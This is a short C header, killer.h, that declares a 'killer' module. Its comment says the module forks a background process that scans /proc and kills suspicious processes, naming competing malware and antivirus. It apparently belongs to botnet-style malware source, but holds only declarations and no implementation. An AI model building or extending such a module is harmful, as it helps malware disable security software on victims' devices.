#ifndef KILLER_H
#define KILLER_H

// Forks a background process that aggressively scans /proc
// and kills suspicious processes (competition/antivirus).
void killer_init(void);

// Signal to stop the killer loop (if implementation logic allows)
void killer_kill(void);

#endif
